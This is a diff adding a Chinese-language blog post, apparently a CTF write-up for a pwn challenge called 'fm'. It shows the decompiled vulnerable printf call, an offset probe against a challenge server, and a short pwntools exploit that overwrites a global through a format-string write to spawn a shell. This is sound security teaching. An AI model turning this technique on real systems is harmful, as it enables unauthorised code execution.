@@ -1,0 +1,66 @@
+---
+layout: post
+title:  fm
+date:   2021-01-31 00:01:01 +0300
+image:  2021-01-31-person.jpg
+tags:   [ctf,PWN,jarvisoj,Fmtstr]
+---
+
+main
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char buf; // [esp+2Ch] [ebp-5Ch]
+  unsigned int v5; // [esp+7Ch] [ebp-Ch]
+
+  v5 = __readgsdword(0x14u);
+  be_nice_to_people();
+  memset(&buf, 0, 0x50u);
+  read(0, &buf, 0x50u);
+  printf(&buf);
+  printf("%d!\n", x);
+  if ( x == 4 )
+  {
+    puts("running sh...");
+    system("/bin/sh");
+  }
+  return 0;
+}
+```
+
+利用格式化字符串任意地址写，将x的值改为4.
+
+x的地址
+
+```assembly
+.data:0804A02C                 public x
+.data:0804A02C x               dd 3                    ; DATA XREF: main+65↑r
+.data:0804A02C                                         ; main+7C↑r
+.data:0804A02C _data           ends
+```
+
+计算偏移量
+
+```assembly
+root@kali1:~/pwn# nc node3.buuoj.cn 25405
+AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.    
+AAAAffb0efac.50.0.f7f94000.f7f94918.ffb0efb0.ffb0f0a4.0.ffb0f044.26.41414141.
+3!
+```
+
+exp：
+
+```assembly
+from pwn import *
+
+io = remote("node3.buuoj.cn",25405)
+
+x_addr = 0x804A02C
+
+payload = p32(x_addr) + "%11$hn"
+io.sendline(payload)
+
+io.interactive()
+```
+
